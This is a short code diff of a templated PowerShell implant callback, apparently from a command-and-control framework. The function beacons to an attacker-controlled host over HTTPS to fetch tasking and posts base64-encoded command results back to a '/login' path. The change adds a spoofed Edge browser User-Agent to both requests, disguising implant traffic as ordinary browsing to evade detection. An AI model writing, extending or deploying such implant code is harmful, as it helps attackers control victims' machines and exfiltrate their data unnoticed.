@@ -10,14 +10,14 @@ class HttpsProfile:
 function {{ ron.HttpsProfile }}(${{ ron.obf_callback_reason }}){
     if ( ${{ ron.obf_callback_reason }} -eq $null ){
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ ports.HttpsProfile_port }}/"
-        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
+        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363"
         $global:headers = $r.Content
     } else {
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ ports.HttpsProfile_port }}/login"
         $enc = [system.Text.Encoding]::UTF8
         $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
         $data2 = $global:command_id+$data2
-        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
+        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363"
         $global:headers = $r.Content
     }
 }'''
